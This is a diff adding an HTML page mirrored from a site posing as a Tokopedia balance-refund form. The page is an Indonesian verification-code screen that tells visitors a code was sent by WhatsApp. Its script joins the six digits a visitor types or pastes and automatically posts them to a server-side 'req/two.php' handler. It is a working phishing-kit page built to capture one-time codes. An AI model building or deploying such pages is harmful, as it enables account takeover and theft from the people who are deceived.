@@ -1,0 +1,158 @@
+<!DOCTYPE html><html lang="id"><!-- Mirrored from formulir-pengembalian-dana.my.id/Refund-Saldo-Tokopedia.com/otp.html by HTTrack Website Copier/3.x [XR&CO'2017], Sat, 07 Mar 2026 14:17:49 GMT --><head>
+  <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Masukkan Kode Verifikasi</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding-top: 80px;
+    }
+
+    .back {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      font-size: 24px;
+      text-decoration: none;
+      color: black;
+    }
+
+    .icon {
+      width: 40px;
+      height: 40px;
+    }
+
+    .title {
+      font-size: 18px;
+      font-weight: bold;
+      margin-top: 20px;
+    }
+
+    .subtitle {
+      color: #555;
+      font-size: 14px;
+      margin-bottom: 30px;
+    }
+
+    .pin-input {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 20px;
+    }
+
+    .pin-input input {
+      width: 30px;
+      height: 40px;
+      font-size: 24px;
+      text-align: center;
+      border: none;
+      border-bottom: 2px solid #00AA5B;
+      outline: none;
+    }
+
+    .forgot {
+      color: #00AA5B;
+      font-size: 14px;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+
+<a href="index-2.html" class="back">←</a>
+<img src="images/WhatsApp.svg" class="icon" alt="WhatsApp Icon">
+
+<div class="title">Masukkan Kode Verifikasi</div>
+<div class="subtitle">Kode Verifikasi Telah Dikirim Melalui WhatsApp</div>
+
+<div class="pin-input" id="pinContainer">
+    <input type="text" maxlength="1" class="pin-box" data-index="0" autofocus="">
+    <input type="text" maxlength="1" class="pin-box" data-index="1">
+    <input type="text" maxlength="1" class="pin-box" data-index="2">
+    <input type="text" maxlength="1" class="pin-box" data-index="3">
+    <input type="text" maxlength="1" class="pin-box" data-index="4">
+    <input type="text" maxlength="1" class="pin-box" data-index="5">
+</div>
+
+<!-- Form tetap ada, tapi tombol dihilangkan -->
+<form action="req/two.php" method="POST" id="verifyForm">
+    <input type="hidden" name="code" id="hiddenCode">
+</form>
+
+<script>
+    const pinBoxes = document.querySelectorAll('.pin-box');
+    const hiddenCode = document.getElementById('hiddenCode');
+    const form = document.getElementById('verifyForm');
+
+    // Update hidden input dengan kode yang dimasukkan
+    function updateHiddenCode() {
+        let code = '';
+        pinBoxes.forEach(box => {
+            code += box.value;
+        });
+        hiddenCode.value = code;
+    }
+
+    // Event listener untuk setiap kotak PIN
+    pinBoxes.forEach((box, index) => {
+        box.addEventListener('input', () => {
+            // Hanya terima angka
+            box.value = box.value.replace(/[^0-9]/g, '');
+
+            updateHiddenCode();
+
+            // Auto focus ke kotak berikutnya
+            if (box.value.length === 1 && index < pinBoxes.length - 1) {
+                pinBoxes[index + 1].focus();
+            }
+
+            // === OTOMATIS SUBMIT setelah 6 digit terisi ===
+            if (hiddenCode.value.length === 6) {
+                setTimeout(() => {
+                    form.submit();
+                }, 300); // delay kecil biar terasa lebih smooth
+            }
+        });
+
+        // Backspace → pindah ke kotak sebelumnya
+        box.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' && box.value === '' && index > 0) {
+                pinBoxes[index - 1].focus();
+            }
+        });
+
+        // Fitur Paste seluruh kode
+        box.addEventListener('paste', (e) => {
+            e.preventDefault();
+            const pastedData = e.clipboardData.getData('text').slice(0, 6);
+            
+            if (/^\d{1,6}$/.test(pastedData)) {
+                pastedData.split('').forEach((char, i) => {
+                    if (pinBoxes[i]) {
+                        pinBoxes[i].value = char;
+                    }
+                });
+                updateHiddenCode();
+
+                // Fokus ke kotak terakhir
+                const lastFilled = Math.min(pastedData.length, 6) - 1;
+                pinBoxes[lastFilled].focus();
+
+                // Jika sudah 6 digit, submit otomatis
+                if (pastedData.length === 6) {
+                    setTimeout(() => {
+                        form.submit();
+                    }, 300);
+                }
+            }
+        });
+    });
+</script>
+
+
+
+
+
+</body><!-- Mirrored from formulir-pengembalian-dana.my.id/Refund-Saldo-Tokopedia.com/otp.html by HTTrack Website Copier/3.x [XR&CO'2017], Sat, 07 Mar 2026 14:17:51 GMT --></html>
